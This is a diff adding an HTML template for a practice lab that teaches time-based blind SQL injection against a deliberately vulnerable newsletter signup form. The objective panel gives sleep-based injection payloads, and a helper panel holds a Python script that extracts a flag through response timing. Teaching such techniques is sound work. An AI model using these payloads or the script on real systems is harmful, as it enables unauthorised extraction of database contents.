@@ -1,0 +1,143 @@
+{% extends "base.html" %}
+{% block title %}Lab 6 — Time-Based Blind | Hunt Labs{% endblock %}
+{% block nav_extra %}<a href="{{ url_for('lab6.interview') }}">Interview Prep</a>{% endblock %}
+
+{% block content %}
+<div class="page lab-page">
+  {% if solved %}<div class="solved-banner"><div class="solved-banner-icon">🎉</div><div><div class="solved-banner-text">Lab Complete!</div><div class="solved-banner-sub">You used timing as a side channel to extract data.</div></div></div>{% endif %}
+
+  <div class="lab-header">
+    <div class="lab-header-info">
+      <div class="lab-header-meta">
+        <span class="badge badge-advanced">Advanced</span>
+        <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">LAB 06</span>
+        <span class="rating-stars" style="font-size:0.7rem"><span class="star-filled">★★★★</span><span class="star-empty">★</span> Interview</span>
+        <span class="rating-stars" style="font-size:0.7rem"><span class="star-filled">★★★★★</span> Hunt</span>
+      </div>
+      <h1>Time-Based Blind Injection</h1>
+      <p class="lab-header-desc">The newsletter signup always returns the same response — no data, no errors, no boolean signal. Use conditional <code>sleep()</code> delays to infer the flag character by character from response timing.</p>
+    </div>
+    <div class="lab-header-actions">
+      <a href="{{ url_for('lab6.interview') }}" class="btn btn-ghost btn-sm">Interview Prep</a>
+      <form method="post" action="{{ url_for('lab6.reset') }}" onsubmit="return confirm('Reset?')">
+        <button type="submit" class="btn btn-danger btn-sm">Reset</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="lab-body">
+    <div style="display:flex;flex-direction:column;gap:16px;">
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">📧 Newsletter Signup</span></div>
+        <div class="panel-body">
+          <p style="color:var(--text-muted);font-size:0.875rem;margin-bottom:16px;">Stay up to date with our latest security research.</p>
+          <form method="post" action="{{ url_for('lab6.signup') }}" style="display:flex;gap:8px;">
+            <input type="email" name="email" placeholder="your@email.com" style="flex:1"
+                   value="{{ signup_result.email if signup_result else '' }}"
+                   pattern=".*">
+            <button type="submit" class="btn btn-primary btn-sm">Subscribe</button>
+          </form>
+
+          {% if signup_result %}
+          <div style="margin-top:16px;">
+            <div class="alert alert-info">Thanks, we'll be in touch! (Always the same response.)</div>
+            <div style="margin-top:12px;" data-elapsed="{{ signup_result.elapsed_ms }}">
+              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+                <span style="font-size:0.75rem;color:var(--text-muted)">Response time</span>
+                <span style="font-family:var(--font-mono);font-size:0.875rem;color:var(--blue)">{{ signup_result.elapsed_ms }}ms</span>
+              </div>
+              <div class="timing-bar"><div class="timing-fill" style="width:1%"></div></div>
+              {% if signup_result.elapsed_ms > 1000 %}
+              <p style="font-size:0.75rem;color:var(--yellow);margin-top:4px;">Delay detected — condition may be TRUE</p>
+              {% endif %}
+            </div>
+          </div>
+          {% endif %}
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">Objective</span></div>
+        <div class="panel-body" style="font-size:0.875rem;color:var(--text-muted);display:flex;flex-direction:column;gap:8px;">
+          <div>1. The email field is injected into an INSERT statement.</div>
+          <div>2. Confirm injection with: <code>x@x.com' AND sleep(3)--</code> — if the response takes ~3s, injection works.</div>
+          <div>3. Use conditional sleep to extract the flag: <code>x@x.com' AND IF((SELECT SUBSTR(flag,1,1) FROM secrets)='H',sleep(3),0)--</code></div>
+          <div>4. A response &gt;2s means the condition is TRUE for that character.</div>
+          <div class="alert alert-warning" style="margin:0"><strong>Note:</strong> Sleep is capped at 10s per request for lab stability. Use a threshold of 2s+ to distinguish true from false.</div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">Python Automation Helper</span></div>
+        <div class="panel-body">
+          <div class="terminal">
+<span class="comment"># Time-based extraction skeleton (INSERT context)</span>
+<span class="query">import requests, time
+
+URL = "http://localhost:5000/lab6/signup"
+THRESHOLD = 2.0  # seconds
+
+def is_true(condition):
+    # INSERT context: close string, add condition with sleep, re-close string
+    payload = f"x@x.com' AND (SELECT CASE WHEN ({condition}) THEN sleep(3) ELSE 0 END FROM secrets) AND '1'='1"
+    t0 = time.time()
+    requests.post(URL, data={"email": payload})
+    return (time.time() - t0) > THRESHOLD
+
+flag = ""
+for pos in range(1, 40):
+    for char in "HUNT{}abcdefghijklmnopqrstuvwxyz_0123456789":
+        cond = f"SUBSTR(flag,{pos},1)='{char}'"
+        if is_true(cond):
+            flag += char
+            break
+    else:
+        break
+    print(f"Flag: {flag}")</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:16px;">
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">Submit Flag</span></div>
+        <div class="panel-body">
+          {% if flag_error %}<div class="alert alert-error" data-dismiss="4000">Incorrect flag.</div>{% endif %}
+          {% if solved %}<div class="alert alert-success">Flag accepted!</div>
+          {% else %}
+          <form method="post" action="{{ url_for('lab6.submit_flag') }}" class="flag-form">
+            <input class="flag-input" type="text" name="flag" placeholder="HUNT{...}" autocomplete="off">
+            <button type="submit" class="btn btn-primary btn-full">Submit</button>
+          </form>
+          {% endif %}
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">Hints</span><span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">{{ hints_revealed | length }}/3</span></div>
+        <div class="panel-body">
+          <div class="hints-list">
+            {% for i in range(1, 4) %}
+            <div class="hint-item">
+              <div class="hint-header">Hint {{ i }}{% if i not in hints_revealed %}<form method="post" action="{{ url_for('lab6.hint', n=i) }}" style="margin:0"><button type="submit" class="btn btn-ghost btn-sm">Reveal</button></form>{% endif %}</div>
+              {% if i in hints_revealed %}<div class="hint-content">{{ hints[i-1] | safe }}</div>{% endif %}
+            </div>
+            {% endfor %}
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">Payload Log</span></div>
+        <div class="panel-body">
+          <div class="payload-log">
+            {% for entry in payload_log[:8] %}<div class="log-entry" title="Click to copy"><div class="log-payload">{{ entry.payload | e }}</div></div>{% endfor %}
+            {% if not payload_log %}<div class="log-empty">No payloads yet.</div>{% endif %}
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
